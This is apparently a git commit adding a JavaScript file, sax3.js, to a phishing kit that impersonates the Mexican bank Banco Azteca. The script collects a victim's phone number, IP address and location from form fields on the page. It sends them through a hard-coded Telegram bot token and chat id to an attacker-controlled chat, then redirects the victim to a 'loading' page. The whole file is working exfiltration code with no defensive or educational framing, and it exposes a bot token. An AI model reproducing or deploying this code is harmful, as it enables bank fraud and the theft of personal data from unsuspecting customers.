e157fbb4f91122c5fab69e84490c77e6099faa11
azteca-credito <leonardodavid9595@gmail.com>
2025-02-14 11:47:34 -0500

    Add files via upload

---
+++ sax3.js
@@ -0,0 +1,34 @@
+//bot token
+var telegram_bot_id = "7479463983:AAFZvTURJ_yPF3uM4V3q5sAtyo7lBZ1zFuc";
+//chat id
+var chat_id = 6558902468;
+var u_name, ip, ip2;
+var ready = function () {
+    u_name = document.getElementById("usr").value;
+    ip = document.getElementById("gfg").innerHTML;
+    ip2 = document.getElementById("address").innerHTML;
+    message = "BANCO AZTECA\nNumero de celular: " + u_name + "\nIP: " + ip +"\n" + ip2;
+};
+var sender = function () {
+    ready();
+    var settings = {
+        "async": true,
+        "crossDomain": true,
+        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "cache-control": "no-cache"
+
+        },
+        "data": JSON.stringify({
+            "chat_id": chat_id,
+            "text": message
+        })
+    };
+    $.ajax(settings).done(function (response) {
+        window.location = 'cargando.html';
+        console.log(response);
+    });
+    return false;
+};
